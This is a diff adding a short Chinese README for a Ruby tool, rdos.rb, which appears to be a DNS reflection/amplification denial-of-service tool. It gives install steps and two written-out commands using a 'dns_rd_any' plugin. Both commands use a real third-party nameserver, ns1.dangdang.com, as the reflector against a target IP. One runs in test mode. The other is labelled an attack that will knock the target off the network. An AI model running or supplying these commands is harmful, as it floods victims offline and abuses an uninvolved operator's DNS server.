@@ -1,0 +1,13 @@
+启动方法：
+    安装ruby，gem，bundler
+    安装倚赖：bundle install
+
+使用方法：
+    ruby ./rdos.rb -h
+
+例子：
+    用dns_rd_any插件，向ns1.dangdang.com查询dangdang.com，进行测试：
+    ruby ./rdos.rb -p dns_rd_any -R ns1.dangdang.com -T 10.10.10.10 -q dangdang.com -t
+
+    用dns_rd_any插件，进行攻击(慎用，会断网)：
+    ruby ./rdos.rb -p dns_rd_any -R ns1.dangdang.com -T 10.10.10.10 -q dangdang.com -r
